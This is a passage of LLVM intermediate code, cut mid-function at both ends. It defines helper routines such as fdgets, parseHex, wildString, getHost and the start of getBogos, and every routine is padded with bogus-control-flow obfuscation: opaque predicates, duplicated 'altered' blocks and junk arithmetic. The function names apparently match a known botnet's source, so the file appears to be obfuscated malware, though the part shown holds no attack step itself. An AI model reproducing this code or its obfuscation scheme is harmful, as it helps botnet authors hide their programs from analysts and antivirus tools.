  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %116
  %125 = load i32, i32* @x.21
  %126 = load i32, i32* @y.22
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %140

; <label>:133:                                    ; preds = %originalBBpart212
  %134 = bitcast %struct.in_addr* %9 to i32*
  %135 = load i32, i32* %7, align 4
  store i32 %135, i32* %134, align 4
  %136 = bitcast %struct.in_addr* %9 to i32*
  %137 = load i32, i32* %136, align 4
  %138 = and i32 %137, 65280
  %139 = ashr i32 %138, 8
  br label %140

; <label>:140:                                    ; preds = %133, %originalBBpart216
  %141 = phi i32 [ -1, %originalBBpart216 ], [ %139, %133 ]
  store i32 %141, i32* %2, align 4
  br label %142

; <label>:142:                                    ; preds = %140, %originalBBpart2
  %143 = load i32, i32* @x.21
  %144 = load i32, i32* @y.22
  %145 = sub i32 %143, 1
  %146 = mul i32 %143, %145
  %147 = urem i32 %146, 2
  %148 = icmp eq i32 %147, 0
  %149 = icmp slt i32 %144, 10
  %150 = or i1 %148, %149
  br i1 %150, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %142
  %151 = load i32, i32* %2, align 4
  %152 = load i32, i32* @x.21
  %153 = load i32, i32* @y.22
  %154 = sub i32 %152, 1
  %155 = mul i32 %152, %154
  %156 = urem i32 %155, 2
  %157 = icmp eq i32 %156, 0
  %158 = icmp slt i32 %153, 10
  %159 = or i1 %157, %158
  br i1 %159, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  ret i32 %151

originalBBalteredBB:                              ; preds = %originalBB, %19
  store i32 -1, i32* %2, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %51
  %160 = load i32, i32* %8, align 4
  %161 = icmp eq i32 %160, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %74
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %92
  %162 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #2
  %163 = load i32*, i32** @fdopen_pids, align 8
  %164 = load i32, i32* %4, align 4
  %165 = sext i32 %164 to i64
  %166 = getelementptr inbounds i32, i32* %163, i64 %165
  store i32 0, i32* %166, align 4
  %167 = load i32, i32* %8, align 4
  %168 = icmp eq i32 %167, -1
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %116
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %142
  %169 = load i32, i32* %2, align 4
  br label %originalBB18
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #4

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #4

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #4

declare i32 @waitpid(i32, i32*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = load i32, i32* @x.23
  %5 = load i32, i32* @y.24
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  store i8* %0, i8** %12, align 8
  store i32 %1, i32* %13, align 4
  store i32 %2, i32* %14, align 4
  store i32 1, i32* %15, align 4
  store i32 0, i32* %16, align 4
  %17 = load i32, i32* @x.23
  %18 = load i32, i32* @y.24
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %25

; <label>:25:                                     ; preds = %originalBBpart213, %originalBBpart2
  %26 = load i32, i32* %15, align 4
  %27 = icmp eq i32 %26, 1
  br i1 %27, label %28, label %57

; <label>:28:                                     ; preds = %25
  %29 = load i32, i32* @x.23
  %30 = load i32, i32* @y.24
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %28
  %37 = load i32, i32* %16, align 4
  %38 = load i32, i32* %13, align 4
  %39 = icmp slt i32 %37, %38
  %40 = load i32, i32* @x.23
  %41 = load i32, i32* @y.24
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %39, label %48, label %57

; <label>:48:                                     ; preds = %originalBBpart24
  %49 = load i8*, i8** %12, align 8
  %50 = load i32, i32* %16, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds i8, i8* %49, i64 %51
  %53 = getelementptr inbounds i8, i8* %52, i64 -1
  %54 = load i8, i8* %53, align 1
  %55 = zext i8 %54 to i32
  %56 = icmp ne i32 %55, 10
  br label %57

; <label>:57:                                     ; preds = %48, %originalBBpart24, %25
  %58 = phi i1 [ false, %originalBBpart24 ], [ false, %25 ], [ %56, %48 ]
  br i1 %58, label %59, label %85

; <label>:59:                                     ; preds = %57
  %60 = load i32, i32* @x.23
  %61 = load i32, i32* @y.24
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %59
  %68 = load i32, i32* %14, align 4
  %69 = load i8*, i8** %12, align 8
  %70 = load i32, i32* %16, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds i8, i8* %69, i64 %71
  %73 = call i64 @read(i32 %68, i8* %72, i64 1)
  %74 = trunc i64 %73 to i32
  store i32 %74, i32* %15, align 4
  %75 = load i32, i32* %16, align 4
  %76 = add nsw i32 %75, 1
  store i32 %76, i32* %16, align 4
  %77 = load i32, i32* @x.23
  %78 = load i32, i32* @y.24
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBBpart213, label %originalBB6alteredBB

originalBBpart213:                                ; preds = %originalBB6
  br label %25

; <label>:85:                                     ; preds = %57
  %86 = load i32, i32* @x.23
  %87 = load i32, i32* @y.24
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBB15, label %originalBB15alteredBB

originalBB15:                                     ; preds = %originalBB15alteredBB, %85
  %94 = load i32, i32* %15, align 4
  %95 = icmp eq i32 %94, 0
  %96 = load i32, i32* @x.23
  %97 = load i32, i32* @y.24
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBBpart217, label %originalBB15alteredBB

originalBBpart217:                                ; preds = %originalBB15
  br i1 %95, label %104, label %121

; <label>:104:                                    ; preds = %originalBBpart217
  %105 = load i32, i32* @x.23
  %106 = load i32, i32* @y.24
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %104
  %113 = load i32, i32* @x.23
  %114 = load i32, i32* @y.24
  %115 = sub i32 %113, 1
  %116 = mul i32 %113, %115
  %117 = urem i32 %116, 2
  %118 = icmp eq i32 %117, 0
  %119 = icmp slt i32 %114, 10
  %120 = or i1 %118, %119
  br i1 %120, label %originalBBpart221, label %originalBB19alteredBB

originalBBpart221:                                ; preds = %originalBB19
  br label %139

; <label>:121:                                    ; preds = %originalBBpart217
  %122 = load i32, i32* @x.23
  %123 = load i32, i32* @y.24
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBB23, label %originalBB23alteredBB

originalBB23:                                     ; preds = %originalBB23alteredBB, %121
  %130 = load i8*, i8** %12, align 8
  %131 = load i32, i32* @x.23
  %132 = load i32, i32* @y.24
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBBpart225, label %originalBB23alteredBB

originalBBpart225:                                ; preds = %originalBB23
  br label %139

; <label>:139:                                    ; preds = %originalBBpart225, %originalBBpart221
  %140 = phi i8* [ null, %originalBBpart221 ], [ %130, %originalBBpart225 ]
  ret i8* %140

originalBBalteredBB:                              ; preds = %originalBB, %3
  %141 = alloca i8*, align 8
  %142 = alloca i32, align 4
  %143 = alloca i32, align 4
  %144 = alloca i32, align 4
  %145 = alloca i32, align 4
  store i8* %0, i8** %141, align 8
  store i32 %1, i32* %142, align 4
  store i32 %2, i32* %143, align 4
  store i32 1, i32* %144, align 4
  store i32 0, i32* %145, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %28
  %146 = load i32, i32* %16, align 4
  %147 = load i32, i32* %13, align 4
  %148 = icmp slt i32 %146, %147
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %59
  %149 = load i32, i32* %14, align 4
  %150 = load i8*, i8** %12, align 8
  %151 = load i32, i32* %16, align 4
  %152 = sext i32 %151 to i64
  %153 = getelementptr inbounds i8, i8* %150, i64 %152
  %154 = call i64 @read(i32 %149, i8* %153, i64 1)
  %155 = trunc i64 %154 to i32
  store i32 %155, i32* %15, align 4
  %156 = load i32, i32* %16, align 4
  %_ = sub i32 0, %156
  %gen = add i32 %_, 1
  %_7 = shl i32 %156, 1
  %_8 = sub i32 0, %156
  %gen9 = add i32 %_8, 1
  %_10 = sub i32 %156, 1
  %gen11 = mul i32 %_10, 1
  %157 = add nsw i32 %156, 1
  store i32 %157, i32* %16, align 4
  br label %originalBB6

originalBB15alteredBB:                            ; preds = %originalBB15, %85
  %158 = load i32, i32* %15, align 4
  %159 = icmp eq i32 %158, 0
  br label %originalBB15

originalBB19alteredBB:                            ; preds = %originalBB19, %104
  br label %originalBB19

originalBB23alteredBB:                            ; preds = %originalBB23, %121
  %160 = load i8*, i8** %12, align 8
  br label %originalBB23
}

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  br label %4

; <label>:4:                                      ; preds = %30, %1
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  br i1 %8, label %9, label %12

; <label>:9:                                      ; preds = %4
  %10 = load i64, i64* %3, align 8
  %11 = icmp sge i64 %10, 0
  br label %12

; <label>:12:                                     ; preds = %9, %4
  %13 = phi i1 [ false, %4 ], [ %11, %9 ]
  %14 = load i32, i32* @x.25
  %15 = load i32, i32* @y.26
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %12
  %22 = load i32, i32* @x.25
  %23 = load i32, i32* @y.26
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %13, label %30, label %40

; <label>:30:                                     ; preds = %originalBBpart2
  %31 = load i64, i64* %3, align 8
  %32 = shl i64 %31, 4
  %33 = load i8*, i8** %2, align 8
  %34 = getelementptr inbounds i8, i8* %33, i32 1
  store i8* %34, i8** %2, align 8
  %35 = load i8, i8* %33, align 1
  %36 = zext i8 %35 to i64
  %37 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %36
  %38 = load i64, i64* %37, align 8
  %39 = or i64 %32, %38
  store i64 %39, i64* %3, align 8
  br label %4

; <label>:40:                                     ; preds = %originalBBpart2
  %41 = load i32, i32* @x.25
  %42 = load i32, i32* @y.26
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %40
  %49 = load i64, i64* %3, align 8
  %50 = load i32, i32* @x.25
  %51 = load i32, i32* @y.26
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret i64 %49

originalBBalteredBB:                              ; preds = %originalBB, %12
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %40
  %58 = load i64, i64* %3, align 8
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %86 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %53
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %140

; <label>:13:                                     ; preds = %2
  %14 = load i32, i32* @x.27
  %15 = load i32, i32* @y.28
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %13
  %22 = load i8*, i8** %4, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 1
  %24 = load i8*, i8** %5, align 8
  %25 = call i32 @wildString(i8* %23, i8* %24)
  %26 = icmp ne i32 %25, 0
  %27 = load i32, i32* @x.27
  %28 = load i32, i32* @y.28
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %26, label %35, label %49

; <label>:35:                                     ; preds = %originalBBpart2
  %36 = load i8*, i8** %5, align 8
  %37 = load i8, i8* %36, align 1
  %38 = zext i8 %37 to i32
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %40, label %47

; <label>:40:                                     ; preds = %35
  %41 = load i8*, i8** %4, align 8
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i64 1
  %44 = call i32 @wildString(i8* %41, i8* %43)
  %45 = icmp ne i32 %44, 0
  %46 = xor i1 %45, true
  br label %47

; <label>:47:                                     ; preds = %40, %35
  %48 = phi i1 [ false, %35 ], [ %46, %40 ]
  br label %49

; <label>:49:                                     ; preds = %47, %originalBBpart2
  %50 = phi i1 [ true, %originalBBpart2 ], [ %48, %47 ]
  %51 = xor i1 %50, true
  %52 = zext i1 %51 to i32
  store i32 %52, i32* %3, align 4
  br label %140

; <label>:53:                                     ; preds = %2
  %54 = load i32, i32* @x.27
  %55 = load i32, i32* @y.28
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %53
  %62 = load i8*, i8** %5, align 8
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp ne i32 %64, 0
  %66 = load i32, i32* @x.27
  %67 = load i32, i32* @y.28
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %65, label %74, label %82

; <label>:74:                                     ; preds = %originalBBpart24
  %75 = load i8*, i8** %4, align 8
  %76 = getelementptr inbounds i8, i8* %75, i64 1
  %77 = load i8*, i8** %5, align 8
  %78 = getelementptr inbounds i8, i8* %77, i64 1
  %79 = call i32 @wildString(i8* %76, i8* %78)
  %80 = icmp ne i32 %79, 0
  %81 = xor i1 %80, true
  br label %82

; <label>:82:                                     ; preds = %74, %originalBBpart24
  %83 = phi i1 [ false, %originalBBpart24 ], [ %81, %74 ]
  %84 = xor i1 %83, true
  %85 = zext i1 %84 to i32
  store i32 %85, i32* %3, align 4
  br label %140

; <label>:86:                                     ; preds = %2
  %87 = load i32, i32* @x.27
  %88 = load i32, i32* @y.28
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %86
  %95 = load i8*, i8** %4, align 8
  %96 = load i8, i8* %95, align 1
  %97 = zext i8 %96 to i32
  %98 = call i32 @toupper(i32 %97) #10
  %99 = load i8*, i8** %5, align 8
  %100 = load i8, i8* %99, align 1
  %101 = zext i8 %100 to i32
  %102 = call i32 @toupper(i32 %101) #10
  %103 = icmp eq i32 %98, %102
  %104 = load i32, i32* @x.27
  %105 = load i32, i32* @y.28
  %106 = sub i32 %104, 1
  %107 = mul i32 %104, %106
  %108 = urem i32 %107, 2
  %109 = icmp eq i32 %108, 0
  %110 = icmp slt i32 %105, 10
  %111 = or i1 %109, %110
  br i1 %111, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %103, label %112, label %120

; <label>:112:                                    ; preds = %originalBBpart28
  %113 = load i8*, i8** %4, align 8
  %114 = getelementptr inbounds i8, i8* %113, i64 1
  %115 = load i8*, i8** %5, align 8
  %116 = getelementptr inbounds i8, i8* %115, i64 1
  %117 = call i32 @wildString(i8* %114, i8* %116)
  %118 = icmp ne i32 %117, 0
  %119 = xor i1 %118, true
  br label %120

; <label>:120:                                    ; preds = %112, %originalBBpart28
  %121 = phi i1 [ false, %originalBBpart28 ], [ %119, %112 ]
  %122 = load i32, i32* @x.27
  %123 = load i32, i32* @y.28
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %120
  %130 = xor i1 %121, true
  %131 = zext i1 %130 to i32
  store i32 %131, i32* %3, align 4
  %132 = load i32, i32* @x.27
  %133 = load i32, i32* @y.28
  %134 = sub i32 %132, 1
  %135 = mul i32 %132, %134
  %136 = urem i32 %135, 2
  %137 = icmp eq i32 %136, 0
  %138 = icmp slt i32 %133, 10
  %139 = or i1 %137, %138
  br i1 %139, label %originalBBpart220, label %originalBB10alteredBB

originalBBpart220:                                ; preds = %originalBB10
  br label %140

; <label>:140:                                    ; preds = %originalBBpart220, %82, %49, %9
  %141 = load i32, i32* %3, align 4
  ret i32 %141

originalBBalteredBB:                              ; preds = %originalBB, %13
  %142 = load i8*, i8** %4, align 8
  %143 = getelementptr inbounds i8, i8* %142, i64 1
  %144 = load i8*, i8** %5, align 8
  %145 = call i32 @wildString(i8* %143, i8* %144)
  %146 = icmp ne i32 %145, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %53
  %147 = load i8*, i8** %5, align 8
  %148 = load i8, i8* %147, align 1
  %149 = zext i8 %148 to i32
  %150 = icmp ne i32 %149, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %86
  %151 = load i8*, i8** %4, align 8
  %152 = load i8, i8* %151, align 1
  %153 = zext i8 %152 to i32
  %154 = call i32 @toupper(i32 %153) #10
  %155 = load i8*, i8** %5, align 8
  %156 = load i8, i8* %155, align 1
  %157 = zext i8 %156 to i32
  %158 = call i32 @toupper(i32 %157) #10
  %159 = icmp eq i32 %154, %158
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %120
  %_ = shl i1 %121, true
  %_11 = sub i1 %121, true
  %gen = mul i1 %_11, true
  %_12 = shl i1 %121, true
  %_13 = sub i1 %121, true
  %gen14 = mul i1 %_13, true
  %_15 = shl i1 %121, true
  %_16 = shl i1 %121, true
  %_17 = sub i1 false, %121
  %gen18 = add i1 %_17, true
  %160 = xor i1 %121, true
  %161 = zext i1 %160 to i32
  store i32 %161, i32* %3, align 4
  br label %originalBB10
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = load i32, i32* @x.29
  %4 = load i32, i32* @y.30
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca %struct.in_addr*, align 8
  %14 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %12, align 8
  store %struct.in_addr* %1, %struct.in_addr** %13, align 8
  %15 = load i8*, i8** %12, align 8
  %16 = call i32 @inet_addr(i8* %15) #2
  %17 = load %struct.in_addr*, %struct.in_addr** %13, align 8
  %18 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %17, i32 0, i32 0
  store i32 %16, i32* %18, align 4
  %19 = icmp eq i32 %16, -1
  %20 = load i32, i32* @x.29
  %21 = load i32, i32* @y.30
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %19, label %28, label %29

; <label>:28:                                     ; preds = %originalBBpart2
  store i32 1, i32* %11, align 4
  br label %30

; <label>:29:                                     ; preds = %originalBBpart2
  store i32 0, i32* %11, align 4
  br label %30

; <label>:30:                                     ; preds = %29, %28
  %31 = load i32, i32* @x.29
  %32 = load i32, i32* @y.30
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %30
  %39 = load i32, i32* %11, align 4
  %40 = load i32, i32* @x.29
  %41 = load i32, i32* @y.30
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret i32 %39

originalBBalteredBB:                              ; preds = %originalBB, %2
  %48 = alloca i32, align 4
  %49 = alloca i8*, align 8
  %50 = alloca %struct.in_addr*, align 8
  %51 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %49, align 8
  store %struct.in_addr* %1, %struct.in_addr** %50, align 8
  %52 = load i8*, i8** %49, align 8
  %53 = call i32 @inet_addr(i8* %52) #2
  %54 = load %struct.in_addr*, %struct.in_addr** %50, align 8
  %55 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %54, i32 0, i32 0
  store i32 %53, i32* %55, align 4
  %56 = icmp eq i32 %53, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %30
  %57 = load i32, i32* %11, align 4
  br label %originalBB1
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  br label %3

; <label>:3:                                      ; preds = %7, %1
  %4 = load i8*, i8** %2, align 8
  %5 = load i8, i8* %4, align 1
  %6 = icmp ne i8 %5, 0
  br i1 %6, label %7, label %16

; <label>:7:                                      ; preds = %3
  %8 = load i8*, i8** %2, align 8
  %9 = load i8, i8* %8, align 1
  %10 = zext i8 %9 to i32
  %11 = call i32 @toupper(i32 %10) #10
  %12 = trunc i32 %11 to i8
  %13 = load i8*, i8** %2, align 8
  store i8 %12, i8* %13, align 1
  %14 = load i8*, i8** %2, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %2, align 8
  br label %3

; <label>:16:                                     ; preds = %3
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) #0 {
  %2 = load i32, i32* @x.33
  %3 = load i32, i32* @y.34
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca [4096 x i8], align 16
  %14 = alloca i8*, align 8
  store i8* %0, i8** %11, align 8
  %15 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.307, i32 0, i32 0), i32 0)
  store i32 %15, i32* %12, align 4
  %16 = load i32, i32* @x.33
  %17 = load i32, i32* @y.34
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %24

; <label>:24:                                     ; preds = %226, %originalBBpart2
  %25 = load i32, i32* @x.33
  %26 = load i32, i32* @y.34
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %24
  %33 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i32 0, i32 0
  %34 = load i32, i32* %12, align 4
  %35 = call i8* @fdgets(i8* %33, i32 4096, i32 %34)
  %36 = icmp ne i8* %35, null
  %37 = load i32, i32* @x.33
  %38 = load i32, i32* @y.34
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %36, label %45, label %228

; <label>:45:                                     ; preds = %originalBBpart24
